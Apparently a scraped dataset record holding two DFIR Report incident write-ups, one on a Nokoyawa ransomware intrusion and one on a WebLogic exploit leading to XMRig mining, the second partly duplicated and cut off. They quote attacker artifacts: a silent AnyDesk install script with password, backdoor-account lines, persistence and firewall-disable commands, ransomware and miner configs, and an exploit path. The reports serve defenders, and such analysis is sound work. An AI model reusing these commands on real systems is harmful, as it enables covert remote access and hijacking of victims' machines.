These profiles are preconfigurable and are mostly used to \u2018mimic\u2019 known traffic of different applications, such as a mail client, chat client, or a JavaScript library. The rule that hits, can be seen in the first screenshot below. The second screenshot shows the actual configured portion of the profile, which appears very similar to this \u201cgmail\u201d profile . Communication goes via the URI: /_/scs/mail-static/_js/ The DFIR Report Threat Intel Team picked up this Cobalt Strike server on January 9th, 2023, weeks before the intrusion. On that day, the beacon profile resembled a freely available malleable C2 profile that mimics jquery . The command and control server appears to have been in use through at least April 2024 with a different Cobalt Strike beacon reported to the Triage malware sandboxing service using the same gmail-like profile and remote IP as observed in this intrusion. With that said, it appears Microsoft took over this domain on April 6, 2023 when DNS was switched from Cloudflare to MICROSOFTINTERNETSAFETY.NET and the domain started resolving to 20.69.178.82 (Microsoft). We can see the registration information was updated (date showing last updated) as well: We were also able to locate the complaint by Microsoft, Fortra and Health-ISAC to acquire this domain: Here\u2019s an outtake of the domain and registration information from the complaint . According to The DFIR Report\u2019s Threat Intel Team, the IP was observed hosting Cobalt Strike through June 3, 2023. After initial deployment, the threat actors downloaded additional beacons, all of which have a parent process of the executable called Funa2.exe . It appears that the .dll likely didn\u2019t work as expected, as five minutes later an .exe with the same name gets downloaded. DLL download attempt: Change to EXE download: Shortly after, we find the first connection to the server using the malleable profile paths: AnyDesk During later stages of the intrusion, the threat actors deployed AnyDesk using a PowerShell script copied under C:\\ProgramData\\INSTALL.ps1 . In addition, the copied PowerShell script was executed on multiple systems to facilitate the deployment of AnyDesk using the following commands: mkdir \"C:\\ProgramData\\Any\" # Download AnyDesk $clnt = new-object System.Net.WebClient $url = \"http://download.anydesk.com/AnyDesk.exe\" $file = \"C:\\ProgramData\\AnyDesk.exe\" $clnt.DownloadFile($url,$file) cmd.exe /c C:\\ProgramData\\AnyDesk.exe --install C:\\ProgramData\\Any --start-with-win --silent cmd.exe /c echo btc1000qwe123 | C:\\ProgramData\\Any\\AnyDesk.exe --set-password #net user AD \"2020\" /add #net localgroup Administrators InnLine /ADD #reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" /v InnLine /t REG_DWORD /d 0 /f This install script appears to be similar to the previously leaked powershell script used by Conti : AnyDesk can be used, either as an installed service (as we can see above) or it can use a portable version. The differences and limitations are written on the official site of AnyDesk . As we are dealing with the \u2018installed\u2019 version, it will leave certain artifacts related to the installed version on the system. Multiple people have written about AnyDesk artifacts, such as Inversecos or TylerBrozek , which help a lot during the forensic process related to Anydesk artifacts. For the ad_svc.trace we can find entries like this: info REDACTED gsvc 6600 11452 26 anynet.any_socket - Client-ID: 485343132 (FPR: 9805919074ee). info REDACTED gsvc 6600 11452 46 anynet.any_socket - Logged in from 152.89.196.49:61384 on relay a541c14e info REDACTED gsvc 10136 2256 2515 anynet.any_socket - Client-ID: 547283332 (FPR: 17e2ee445059). info REDACTED gsvc 10136 2256 2515 anynet.any_socket - :54241 on relay ffe9a90c. IP Usage ISP Country AnyDesk Client ID 152.89.196.49 AnyDesk Interactive Starcrecium Limited RU 485343132 185.29.9.162 AnyDesk Interactive DataClub SE 547283332 Exfiltration After the threat actors gained access to a file server in the domain, they quickly prepared this machine for exfiltration. This was performed by downloading the Filezilla FTP client installer using internet explorer on the server. The threat actors were so kind to use the sponsored version, to bring some additional PUP\u2019s as well: Shortly after, the threat actors connected from the file server, using FileZilla, to 45.155.204.5 via SSH and key exchange can be observed in the network traffic: IP Usage ISP Country SSH Info: 45.155.204.5 SSH for FileZilla 3NT Solutions LLP RU Hash : c561c2cdad206b6ed8469079e037e3f9 SSH Version : ssh-2.0-filezilla_3.63.2.1 FileZilla can leave behind some nice forensics artifacts (if the installation is not removed). Writing in this blog by Artifast , a nice overview can be seen. In this case, we were able to recover part of the .xml files resulting in the below correlation between the network data and the host data. While each separate source was already a good finding on its own, this combination leaves less room for guessing. Impact Thirty-four days after the first infection, and about 28 hours after the beginning of hands-on activity, the threat actors proceeded to their final actions, deploying Nokayawa ransomware. The variant of Nokoyawa was similar to those we\u2019ve already reported on . As in most ransomware related cases, before actual deployment, the threat actors looked around to gather information related to backup functionality and systems. In this case, the threat actors moved around between a file server and a backup server, making and viewing configurations, dropping and \u2018debugging\u2019 the ransomware and finally cleaning up. The threat actors started by using mmc.exe to look into the Local Group Policy by using gpedit.msc. Around 20 minutes later, the threat actors started executing the ransomware script on the file server. The ransomware files, in this case svchost.exe and an \u2018automation\u2019 file [REDACTED].1.bat , were delivered via the AnyDesk sessions as parent process. The batch script, [REDACTED].1.bat , launched the executable svchost.exe with a --config parameter, containing a base64 encoded string: { EXTENSION: \"NOKONOKO\", NOTE_NAME: \"NOKONOKO-readme.txt\", NOTE_CONTENT: \"<BASE64 ENCODED NOTEBLOB>\", ECC_PUBLIC: \"AHpyfaG1ftdE4NNQ0laC2825GOpTwUw5Y9+WEMkAAAC0Yd7VSOy7D5CxWhHH4pzSYdCXjpPXqEZ2X2r6kgEAAA==\", SKIP_DIRS: [ \"windows\", \"program files\", \"program files (x86)\", \"appdata\", \"programdata\", \"system volume information\" ], SKIP_EXTS: [ \".exe\", \".dll\", \".ini\", \".lnk\", \".url\" ], ENCRYPT_NETWORK: true, LOAD_HIDDEN_DRIVES: true, DELETE_SHADOW: true } After the execution on the file server, the threat actors moved to the backup server, where they repeated their interest in the Group Policy. On the backup server, they also opened the server configuration. There appeared to be a problem, as there was some \u2018file locking\u2019 in place, likely preventing access. The threat actors tried to circumvent these \u2018locks\u2019 by utilizing a tool called IOBit . This tool is capable of removing file locks. After this, the ransomware was deployed in the same manner as on the file server. However, there appeared to be a problem with the deployment. The threat actors started ProcessHacker and utilized notepad++ to likely fix something related to the ransomware execution. This is based on the fact that, the threat actors executed the ransomware binary 11 times on the backup server and afterwards returned and executed the ransomware a second time on the file server. After encrypting the back up server, the threat actors uninstalled the backup software using add/remove programs. In addition, notepad was used to view the deployed ransom note after the final execution on the file server. The NOTE_CONTENT (from above base64 configuration) appears to be base64 encoded again and decoded gives the following ransom note: Nokoyawa. If you see this, your files have been successfully encrypted and stolen. Don't try to search free decryption method. It's impossible. We are using symmetrical and asymmetric encryption. ATTENTION: - Don't rename encrypted files. - Don't change encrypted files. - Don't use third party software. You are risking irreversibly damaging the file by doing this. If you manage to keep things quiet on your end, this will never be known to the public. To reach an agreement you have 48 hours to visit our Onion Website. How to open Onion links: - Download TOR Browser from official website. - Open and enter this link: http://nokopay<REDACTED> - On the page you will see a chat with the Support. - Send your first message. Don't waste your time. Otherwise all your valuable and sensitive data will be leaked. Our websites are full of companies that doubted the fact of the data breach or it's extent. - http://nokoleakb76znymx443veg4n6fytx6spck6pc7nkr4dvfuygpub6jsid.onion/ - http://hl66646wtlp2naoqnhattngigjp5palgqmbwixepcjyq5i534acgqyad.onion/ - http://snatchteam.top The threat actors only deployed the ransomware on the two servers and did not perform a domain wide deployment. After the ransom of these two systems, the threat actor\u2019s activity ceased. Please consider leaving feedback on this report here . Timeline Diamond Model Indicators Atomic IcedID mrassociattes[.]com (174.138.188.6) aerilaponawki[.]com (193.149.129.131) klindriverfor[.]com (5.255.102.167) alishaskainz[.]com (dr) Cobalt Strike msc-mvc-updates[.]com (91.215.85.183) FileZilla File Exfiltration 45.155.204.5 Computed Contract_02_21_Copy#909.one 5f4d630ef00656726401b205ae4dc88f aa8f2d6d98aa535e05685076ca02f781c2aa6464 9c337d27dab65fc3f4b88666338e13416f218ab75c4b5e37cc396241c225efe8 COIm.jpg d1da347e78bf043e2dc61638e946c3da d87a3c22771b1106a1a52d96df7b2944d93fa184 1ab812f7d829444dc703eeb02ea0a955ec839d5e2a9b619d44ac09a91135cad1 GET_ID.bat a59a7916156c52f732b4c2e321facfe1 8c949a7769d16c285347f650ef2eedac01dc1805 eae2bce6341ff7059b9382bfa0e0daa337ea9948dd729c0c1e1ee9c11c1c0068 INSTALL.ps1 b1f5e4774aa79f643350218df61e33f6 f1e7994c6568f0182a60f64557c7793df5e550ed b378c2aa759625de2ad1be2c4045381d7474b82df7eb47842dc194bb9a134f76 agaloz.dll 76a1f94ed6499b99d2cc500998846875 ca14d61bcf038cda45199f54c7c452ad262a7c88 d6127d614309acbf2a630fe3fb0fda8e4079dcf2045f91aa400d179751d425f7 csrss.exe/Funa2.exe f927cd4f40c7a6dad769a8f9af771a8c 0fdfef7c9cc4305df81b006e898e1592aa822437 06bbb36baf63bc5cb14d7f097745955a4854a62fa3acef4d80c61b4fa002c542 svchost.exe 8800e6f1501f69a0a04ce709e9fa251c 72a1c9ea93d18309769d8be5cdb3daedf1cddcf5 3c9f4145e310f616bd5e36ca177a3f370edc13cf2d54bb87fe99972ecf3f09b4 Detections Network ET MALWARE Observed DNS Query to IcedID Domain (qoipaboni .com) ET MALWARE Win32/IcedID Request Cookie ET INFO Windows Powershell User-Agent Usage ETPRO INFO HTTP Request with Lowercase accept Header Observed ET MALWARE Cobalt Strike Malleable C2 (Unknown Profile) ET SCAN Behavioral Unusual Port 1433 traffic Potential Scan or Infection ET POLICY SMB2 NT Create AndX Request For an Executable File ET SCAN Behavioral Unusual Port 445 traffic Potential Scan or Infection ET POLICY HTTP traffic on port 443 (POST) ET POLICY SMB2 NT Create AndX Request For a DLL File - Possible Lateral Movement ET SCAN Potential SSH Scan OUTBOUND ET HUNTING Possible Powershell .ps1 Script Use Over SMB ET POLICY SMB2 NT Create AndX Request For a Powershell .ps1 File ET HUNTING Suspicious csrss.exe in URI ET INFO Executable Download from dotted-quad Host ET INFO Dotted Quad Host DLL Request Sigma Search rules on detection.fyi or sigmasearchengine.com DFIR Public Rules Repo : b26feb0b-8891-4e66-b2e7-ec91dc045d58 : AnyDesk Network 50046619-1037-49d7-91aa-54fc92923604 : AdFind Discovery 8a0d153f-b4e4-4ea7-9335-892dfbe17221 : NetScan Share Enumeration Write Access Check DFIR Private Rules: baa9adf9-a01c-4c43-ac57-347b630bf69e : Default Cobalt Strike Named Pipes a526e0c3-d53b-4d61-82a1-76d3d1358a30 : Silent Installation of AnyDesk RMM b526e0c3-d53b-4d61-82a1-76d3d1358a31 : AnyDesk RMM Password Setup via Command Line 624f1f33-ee38-4bbe-9f4a-088014e0c26b : IcedID Malware Execution Patterns 37948baa-5310-424c-bb18-b29c56be160f : Suspicious Execution of DLL with Unusual File Extensions Sigma Repo : 530a6faa-ff3d-4022-b315-50828e77eef5 : Anydesk Remote Access Software Service Installation 114e7f1c-f137-48c8-8f54-3088c24ce4b9 : Remote Access Tool - AnyDesk Silent Installation b52e84a3-029e-4529-b09b-71d19dd27e94 : Remote Access Tool - AnyDesk Execution b1377339-fda6-477a-b455-ac0923f9ec2c : Remote Access Tool - AnyDesk Piped Password Via CLI 065b00ca-5d5c-4557-ac95-64a6d0b64d86 : Remote Access Tool - Anydesk Execution From Suspicious Folder 9a132afa-654e-11eb-ae93-0242ac130002 : PUA - AdFind Suspicious Execution 903076ff-f442-475a-b667-4f246bcc203b : Nltest.EXE Execution 5cc90652-4cbd-4241-aa3b-4b462fa5a248 : Potential Recon Activity Via Nltest.EXE 0ef56343-059e-4cb6-adc1-4c3c967c5e46 : Suspicious Execution of Systeminfo 968eef52-9cff-4454-8992-1e74b9cbad6c : Reconnaissance Activity e568650b-5dcd-4658-8f34-ded0b1e13992 : Potential Product Class Reconnaissance Via Wmic.EXE fcc6d700-68d9-4241-9a1a-06874d621b06 : Suspicious File Created Via OneNote Application d5601f8c-b26f-4ab0-9035-69e11a8d4ad2 : CobaltStrike Named Pipe 811e0002-b13b-4a15-9d00-a613fce66e42 : PUA - Process Hacker Execution d5866ddf-ce8f-4aea-b28e-d96485a20d3d : Files With System Process Name In Unsuspected Locations 96036718-71cc-4027-a538-d1587e0006a7 : Windows Processes Suspicious Parent Directory c8557060-9221-4448-8794-96320e6f3e74 : Windows PowerShell User Agent JoeSecurity Repo : 200068 : Execute DLL with spoofed extension Yara https://github.com/The-DFIR-Report/Yara-Rules/blob/main/19772/19772.yar MITRE Credentials In Files - T1552.001 Data Encrypted for Impact - T1486 Data from Network Shared Drive - T1039 Domain Groups - T1069.002 Domain Trust Discovery - T1482 Exfiltration Over Alternative Protocol - T1048 File and Directory Discovery - T1083 Indicator Removal - T1070 Ingress Tool Transfer - T1105 LSASS Memory - T1003.001 Malicious File - T1204.002 Masquerade File Type - T1036.008 Masquerading - T1036 Network Service Discovery - T1046 Phishing - T1566 PowerShell - T1059.001 Process Discovery - T1057 Process Injection - T1055 Regsvr32 - T1218.010 Remote Access Software - T1219 Remote Desktop Protocol - T1021.001 Remote System Discovery - T1018 Rundll32 - T1218.011 Scheduled Task - T1053.005 Security Software Discovery - T1518.001 System Information Discovery - T1082 System Owner/User Discovery - T1033 Web Protocols - T1071.001 Windows Command Shell - T1059.003 Windows Service - T1543.003 Internal case #19772 Share this: Share on X (Opens in new window) X Share on LinkedIn (Opens in new window) LinkedIn Share on Reddit (Opens in new window) Reddit Share on Facebook (Opens in new window) Facebook Share on WhatsApp (Opens in new window) WhatsApp Related Post navigation Threat Brief: WordPress Plugin Exploit Leads to Godzilla Web Shell, Discovery & New CVE From IcedID to Dagon Locker Ransomware in 29 Days Search for: Type your email\u2026 Subscribe Reports Threat Intelligence Detection Rules DFIR Labs Proudly powered by WordPress | Copyright 2023 | The DFIR Report | All Rights Reserved Go Top",
    "expected_count": 7
  },
  {
    "url": "https://thedfirreport.com/2021/06/03/weblogic-rce-leads-to-xmrig/",
    "title": "WebLogic RCE Leads to XMRig \u2013 The DFIR Report",
    "content": "WebLogic RCE Leads to XMRig \u2013 The DFIR Report Skip to content Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts The DFIR Report Real Intrusions by Real Attackers, The Truth Behind the Intrusion Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Thursday, February 12, 2026 Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts cryptominer CVE-2020-14882 WebLogic RCE Leads to XMRig June 3, 2021 Intro This report will review an intrusion where, the threat actor took advantage of a WebLogic remote code execution vulnerability (CVE-2020\u201314882) to gain initial access to the system before installing a coin miner (XMRig). Summary In the attack, the threat actor took around 2 minutes from initial access, to running a persistent coin miner. The speed and number of times the exploit was ran against the target make it likely that this was an automated attack, rather than human operated intrusion. The threat actor exploited CVE-2020-14882 by making a request to the WebLogic server, which allowed the attacker to execute code. The payload then ran a PowerShell command to download a PowerShell script from a remote server. This script downloaded a loader and executed it, then it enabled persistence mechanisms. Next, the loader downloaded XMRig, and started the mining process. While this attack took place around a month ago the payloads used in the intrusion continue to be hosted as of this publication, indicating that this threat is still active and finding vulnerable WebLogic hosts to continue exploiting. Analysis and reporting completed by @tas_kmanager and @TheDFIRReport Reviewed by @iiamaleks and @samaritan_o MITRE ATT&CK Initial Access Before jumping into the details of the attack, it is pertinent to understand CVE-2020-14882. This vulnerability was discovered back in October 2020, which effects Oracle\u2019s WebLogic product. [ 1 ] We previously reported on an intrusion that also used this exploit and ended in a coin miner. This vulnerability is easy to exploit, and leads to remote code execution (RCE) without authentication. Just by invoking URL path /console/images/%252E%252E%252Fconsole.portal and a little bit of tweaking of the packet sent to the server, the threat actor will be able to run their code on the server. In this case, we can clearly see from network logs that the attacker was probing the portal page and followed that by sending the crafted URL request. The detailed payload in the header can be observed below: Interestingly, we can see the threat actor chose the FileSystemXmlApplicationContext class to carry out this attack, executing a file named poc.xml . This technique is listed in PoC developed by Jang. [ 2 ] Below we can see the payload inside of the xml file hosted in the attacker server. The payload will execute the PowerShell command on the vulnerable system. Execution The threat actor leveraged the WebLogic vulnerability to spawn a command shell from the server running in the Java process, which then in turn, was used to run PowerShell and collect the final payload that the threat actor wished to run on the system. Next, let us investigate the content of the PowerShell script (ldr.ps1) On line one, we can see var $cc (can be pronounced as C2?) that indicates the server where it will get all the other components such as the payload sys.exe. The next line sets up random characters to be appended to the payload executable. This binary (renamed to sysvr013.exe ) was then executed by the same script. Persistence There are several persistence mechanisms observed. The first one utilizes schtasks to create a task called \u201c BrowserUpdate \u201d. schtasks /create /F /sc minute /mo 1 /tn \"BrowserUpdate\" /tr \"$dst\" It also created a registry run key to execute the miner binary on reboot. We also observed the Loader binary adding npf.sys (WinPcap binary) as a scheduled task. Privilege Escalation No privilege escalation was observed, but note that the Java.exe process was running as a high integrity process from the start. Defense Evasion From the PowerShell script above (ldr.ps1), we can see that name is being randomized to avoid detection by blue team. We can also see that the attacker disabled firewall rules to make sure connection to the mining pool was not blocked. netsh advfirewall set allprofiles state off As noted above, the attacker created a task called \u201c BrowserUpdate \u201d to masquerade the scheduled task as a web browser update task. Discovery We can see several local discovery commands executed from the PowerShell script. They are looking for existing mining process on the machine, such as kthreaddi , sysrv , etc. They also utilize netstat to find if any process is using mining related ports, such as 3333, 4444, etc. This is likely partially to kill other rival miners but also to prevent duplicate miners on the same host as the exploit was executed against the target repeatedly in quick succession, at least 12 times. Impact We saw that the additional sys.exe binary and ldr.ps1 PowerShell script was brought in to support the Mining operation from IP address 194[.]145[.]227[.]21 We also observed connection from [kthreaddi].exe talking to crypto mining pools Eventually, the crypto mining operation will cause performance issue with the WebLogic server. XMRig Config file { \"api\": { \"id\": null, \"worker-id\": null }, \"autosave\": false, \"background\": true, \"randomx\": { \"init\": -1, \"mode\": \"auto\", \"1gb-pages\": false, \"rdmsr\": true, \"wrmsr\": true, \"cache_qos\": false, \"numa\": true, \"scratchpad_prefetch_mode\": 1 }, \"cpu\": { \"enabled\": true, \"huge-pages\": true, \"huge-pages-jit\": false, \"hw-aes\": null, \"priority\": null, \"memory-pool\": false, \"yield\": true, \"max-threads-hint\": 100, \"asm\": true, \"argon2-impl\": null, \"astrobwt-max-size\": 550, \"cn/0\": false, \"cn-lite/0\": false, \"kawpow\": false }, \"donate-level\": 0, \"donate-over-proxy\": 0, \"log-file\": null, \"pools\": [ { \"algo\": null, \"coin\": \"monero\", \"url\": \"xmr-eu2.nanopool.org:14444\", \"user\": \"49dnvYkWkZNPrDj3KF8fR1BHLBfiVArU6Hu61N9gtrZWgbRptntwht5JUrXX1ZeofwPwC6fXNxPZfGjNEChXttwWE3WGURa.w\", \"pass\": \"x\", \"rig-id\": null, \"nicehash\": false, \"keepalive\": false, \"enabled\": true, \"tls\": false, \"tls-fingerprint\": null, \"daemon\": false, \"socks5\": null, \"m-select\": null }, { \"algo\": null, \"coin\": \"monero\", \"url\": \"xmr.f2pool.com:13531\", \"user\": \"49dnvYkWkZNPrDj3KF8fR1BHLBfiVArU6Hu61N9gtrZWgbRptntwht5JUrXX1ZeofwPwC6fXNxPZfGjNEChXttwWE3WGURa\", \"pass\": \"x\", \"rig-id\": null, \"nicehash\": false, \"keepalive\": false, \"enabled\": true, \"tls\": false, \"tls-fingerprint\": null, \"daemon\": false, \"socks5\": null, \"self-select\": null } ], \"retries\": 5, \"retry-pause\": 5, \"syslog\": false, \"user-agent\": null, \"verbose\": 0, \"watch\": false, \"pause-on-battery\": false } IOCs Files: Ldr.ps1 d8a0ad2486c9662c8ac8c4370c7986bdc02dc6bdb8155dcc537f10dd00252d1d Sys.exe 618a1d0e1e1f6d0a34a5ab6c08acf058ffe46938f53b3357f388df1c7909fc45 Sysvr013.exe 80bc76202b75201c740793ea9cd33b31cc262ef01738b053e335ee5d07a5ba96 [kthreaddi].exe a2f3ecd329d2713855257bf922b8a092cbb1193327ba197351804275286df7dd Network: Exploit Source IP 191[.]252[.]219[.]71 http://194.145.227[.]21/poc.xml http://194.145.227[.]21/pocwin.xml http://194.145.227[.]21/ldr.ps1 Detection Sigma please note that you need to enable webserver logging on the WebLogic server https://github.com/SigmaHQ/sigma/blob/master/rules/web/web_cve_2020_14882_weblogic_exploit.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_susp_schtask_creation.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_susp_direct_asep_reg_keys_modification.yml Snort SERVER-WEBAPP Oracle WebLogic Server command injection attempt https://www.snort.org/rule_docs/1-56202 Suricata ET INFO Executable Download from dotted-quad Host AV POLICY HTTP request for .exe file with no User-Agent ET CURRENT_EVENTS Terse alphanumeric executable downloader high likelihood of being hostile ET INFO Packed Executable Download ET INFO Executable Retrieved With Minimal HTTP Headers - Potential Second Stage Download ET INFO SUSPICIOUS Dotted Quad Host MZ Response ET POLICY Cryptocurrency Miner Checkin ETPRO POLICY XMR CoinMiner Usage ETPRO TROJAN CoinMiner Known Malicious Stratum Authline YARA /* YARA Rule Set Author: The DFIR Report Date: 2021-06-03 Identifier: 3580 WebLogic XMRig Miner Reference: https://thedfirreport.com */ /* Rule Set ----------------------------------------------------------------- */ import \"pe\" rule sysrv013 { meta: description = \"files - file sysrv013.exe\" author = \"The DFIR Report\" reference = \"https://thedfirreport.com\" date = \"2021-06-03\" hash1 = \"80bc76202b75201c740793ea9cd33b31cc262ef01738b053e335ee5d07a5ba96\" strings: $s1 = \"eDumped\" fullword ascii $s2 = \"OGhZVFNVRms6\" fullword ascii /* base64 encoded string '8hYTSUFk:' */ $s3 = \"sdumpsebslemW^\" fullword ascii $s4 = \":ERNEL32.DLLODe?\" fullword ascii $s5 = \"pircsek\" fullword ascii $s6 = \"IDE5NC4xNDUu\" fullword ascii /* base64 encoded string ' 194.145.' */ $s7 = \"333444\" ascii /* reversed goodware string '444333' */ $s8 = \"aHx8d2dldCAtLXVzZXItYW\" fullword ascii /* base64 encoded string 'h||wget --user-a' */ $s9 = \"h -c {%\" fullword ascii $s10 = \"?$?)?2?9?{\" fullword ascii /* hex encoded string ')' */ $s11 = \";5A;6D2!D\" fullword ascii /* hex encoded string 'Zm-' */ $s12 = \"3GRAt\\\\5\" fullword ascii $s13 = \"Gorget{\" fullword ascii $s14 = \"7!7&7,727\" fullword ascii /* hex encoded string 'ww'' */ $s15 = \"* {5C;\" fullword ascii $s16 = \"fsftp_fC\" fullword ascii $s17 = \"POSTulL\" fullword ascii $s18 = \"gogetv/\" fullword ascii $s19 = \"\\\\x86+.pdb\" fullword ascii $s20 = \"_DIRCWD?\" fullword ascii condition: uint16(0) == 0x5a4d and filesize < 10000KB and ( pe.imphash() == \"406f4cbdf82bde91761650ca44a3831a\" or 8 of them ) } MITRE Exploit Public-Facing Application \u2013 T1190 Command and Scripting Interpreter: PowerShell \u2013 T1059.001 Command and Scripting Interpreter: Windows Command Shell \u2013 T1059.003 Scheduled Task/Job: Scheduled Task \u2013 T1053.005 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder \u2013 T1547.001 Impair Defenses: Disable or Modify System Firewall \u2013 T1562.004 Masquerading: Masquerade Task or Service \u2013 T1036.004 Process Discovery \u2013 T1057 System Network Connections Discovery \u2013 T1049 Ingress Tool Transfer \u2013 T1105 Application Layer Protocol: Web Protocols \u2013 T1071.001 Resource Hijacking \u2013 T1496 Internal case 3580 Share this: Share on X (Opens in new window) X Share on LinkedIn (Opens in new window) LinkedIn Share on Reddit (Opens in new window) Reddit Share on Facebook (Opens in new window) Facebook Share on WhatsApp (Opens in new window) WhatsApp Related Post navigation Conti Ransomware From Word to Lateral Movement in 1 Hour Search for: Type your email\u2026 Subscribe Reports Threat Intelligence Detection Rules DFIR Labs Proudly powered by WordPress | Copyright 2023 | The DFIR Report | All Rights Reserved Go Top",
    "filtered_content": "WebLogic RCE Leads to XMRig \u2013 The DFIR Report Skip to content Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts The DFIR Report Real Intrusions by Real Attackers, The Truth Behind the Intrusion Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Thursday, February 12, 2026 Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts cryptominer CVE-2020-14882 WebLogic RCE Leads to XMRig June 3, 2021 Intro This report will review an intrusion where, the threat actor took advantage of a WebLogic remote code execution vulnerability (CVE-2020\u201314882) to gain initial access to the system before installing a coin miner (XMRig). Summary In the attack, the threat actor took around 2 minutes from initial access, to running a persistent coin miner. The speed and number of times the exploit was ran against the target make it likely that this was an automated attack, rather than human operated intrusion. The threat actor exploited CVE-2020-14882 by making a request to the WebLogic server, which allowed the attacker to execute code. The payload then ran a PowerShell command to download a PowerShell script from a remote server. This script downloaded a loader and executed it, then it enabled persistence mechanisms. Next, the loader downloaded XMRig, and started the mining process. While this attack took place around a month ago the payloads used in the intrusion continue to be hosted as of this publication, indicating that this threat is still active and finding vulnerable WebLogic hosts to continue exploiting. Analysis and reporting completed by @tas_kmanager and @TheDFIRReport Reviewed by @iiamaleks and @samaritan_o MITRE ATT&CK Initial Access Before jumping into the details of the attack, it is pertinent to understand CVE-2020-14882. This vulnerability was discovered back in October 2020, which effects Oracle\u2019s WebLogic product. [ 1 ] We previously reported on an intrusion that also used this exploit and ended in a coin miner. This vulnerability is easy to exploit, and leads to remote code execution (RCE) without authentication. Just by invoking URL path /console/images/%252E%252E%252Fconsole.portal and a little bit of tweaking of the packet sent to the server, the threat actor will be able to run their code on the server. In this case, we can clearly see from network logs that the attacker was probing the portal page and followed that by sending the crafted URL request. The detailed payload in the header can be observed below: Interestingly, we can see the threat actor chose the FileSystemXmlApplicationContext class to carry out this attack, executing a file named poc.xml . This technique is listed in PoC developed by Jang. [ 2 ] Below we can see the payload inside of the xml file hosted in the attacker server. The payload will execute the PowerShell command on the vulnerable system. Execution The threat actor leveraged the WebLogic vulnerability to spawn a command shell from the server running in the Java process, which then in turn, was used to run PowerShell and collect the final payload that the threat actor wished to run on the system. Next, let us investigate the content of the PowerShell script (ldr.ps1) On line one, we can see var $cc (can be pronounced as C2?) that indicates the server where it will get all the other components such as the payload sys.exe. The next line sets up random characters to be appended to the payload executable. This binary (renamed to sysvr013.exe ) was then executed by the same script. Persistence There are several persistence mechanisms observed. The first one utilizes schtasks to create a task called \u201c BrowserUpdate \u201d. schtasks /create /F /sc minute /mo 1 /tn \"BrowserUpdate\" /tr \"$dst\" It also created a registry run key to execute the miner binary on reboot. We also observed the Loader binary adding npf.sys (WinPcap binary) as a scheduled task. Privilege Escalation No privilege escalation was observed, but note that the Java.exe process was running as a high integrity process from the start. Defense Evasion From the PowerShell script above (ldr.ps1), we can see that name is being randomized to avoid detection by blue team. We can also see that the attacker disabled firewall rules to make sure connection to the mining pool was not blocked. netsh advfirewall set allprofiles state off As noted above, the attacker created a task called \u201c BrowserUpdate \u201d to masquerade the scheduled task as a web browser update task. Discovery We can see several local discovery commands executed from the PowerShell script. They are looking for existing mining process on the machine, such as kthreaddi , sysrv , etc. They also utilize netstat to find if any process is using mining related ports, such as 3333, 4444, etc. This is likely partially to kill other rival miners but also to prevent duplicate miners on the same host as the exploit was executed against the target repeatedly in quick succession, at least 12 times. Impact We saw that the additional sys.exe binary and ldr.ps1 PowerShell script was brought in to support the Mining operation from IP address 194[.]145[.]227[.]21 We also observed connection from [kthreaddi].exe talking to crypto mining pools Eventually, the crypto mining operation will cause performance issue with the WebLogic server. XMRig Config file { \"api\": { \"id\": null, \"worker-id\": null }, \"autosave\": false, \"background\": true, \"randomx\": { \"init\": -1, \"mode\": \"auto\", \"1gb-pages\": false, \"rdmsr\": true, \"wrmsr\": true, \"cache_qos\": false, \"numa\": true, \"scratchpad_prefetch_mode\": 1 }, \"cpu\": { \"enabled\": true, \"huge-pages\": true, \"huge-pages-jit\": false, \"hw-aes\": null, \"priority\": null, \"memory-pool\": false, \"yield\": true, \"max-threads-hint\": 100, \"asm\": true, \"argon2-impl\": null, \"astrobwt-max-size\": 550, \"cn/0\": false, \"cn-lite/0\": false, \"kawpow\": false }, \"donate-level\": 0, \"donate-over-proxy\": 0, \"log-file\": null, \"pools\": [ { \"algo\": null, \"coin\": \"monero\", \"url\": \"xmr-eu2.nanopool.org:14444\", \"user\": \"49dnvYkWkZNPrDj3KF8fR1BHLBfiVArU6Hu61N9gtrZWgbRptntwht5JUrXX1ZeofwPwC6fXNxPZfGjNEChXttwWE3WGURa.w\", \"pass\": \"x\", \"rig-id\": null, \"nicehash\": false, \"keepalive\": false, \"enabled\": true, \"tls\": false, \"tls-fingerprint\": null, \"daemon\": false, \"socks5\": null, \"m-select\": null }, { \"algo\": null, \"coin\": \"monero\", \"url\": \"xmr.f2pool.com:13531\", \"user\": \"49dnvYkWkZNPrDj3KF8fR1BHLBfiVArU6Hu61N9gtrZWgbRptntwht5JUrXX1ZeofwPwC6fXNxPZfGjNEChXttwWE3WGURa\", \"pass\": \"x\", \"rig-id\": null, \"nicehash\": false, \"keepalive\": false, \"enabled\": true, \"tls\": false, \"tls-fingerprint\": null, \"daemon\": false, \"socks5\": null, \"self-select\": null } ], \"retries\": 5, \"retry-pause\": 5, \"syslog\": false, \"user-agent\": null, \"verbose\": 0, \"watch\": false, \"pause-on-battery\": false } IOCs Files: Ldr.ps1 d8a0ad2486c9662c8ac8c4370c7986bdc02dc6bdb8155dcc537f10dd00252d1d Sys.exe 